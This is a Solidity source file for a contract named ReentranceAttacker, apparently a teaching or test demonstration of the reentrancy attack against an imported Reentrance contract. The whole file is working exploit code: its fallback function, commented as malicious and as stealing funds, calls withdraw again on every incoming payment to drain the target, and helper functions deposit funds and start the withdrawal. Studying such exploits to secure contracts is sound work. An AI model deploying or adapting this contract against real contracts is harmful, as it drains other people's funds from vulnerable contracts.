pragma solidity ^0.4.4;
import "./Reentrance.sol";

contract ReentranceAttacker {
	address private owner;
	
	function ReentranceAttacker() public {
		owner = msg.sender;
	}
	
	// malicious fallback function
	// called by Reentrance to deposit from after execution of withdrawFromExternal
	// this function steals the funds from reentrance
	function () payable public {
	    Reentrance r = Reentrance(msg.sender);
		r.withdraw.gas(100000)(); // withdraws again from the contract
	}

	// makes call to Reentrance contract to deposit funds  // not malicious
	function depositToExternal(address reentranceAddress) payable public {
		assert(owner == msg.sender);
		Reentrance r = Reentrance(reentranceAddress);
		r.deposit.gas(100000).value(msg.value)();
	}

	// makes call to Reentrance contract to withdraw funds
	// this code is not inherintly malicious, only when used with the fallback function
	function withdrawFromExternal(address reentranceAddress) payable public {
		assert(owner == msg.sender);
		Reentrance r = Reentrance(reentranceAddress);
		r.withdraw.gas(100000)();
	}

    // added to simplify testing
    function getBalance() constant public returns(uint) {
        return this.balance;
    }

}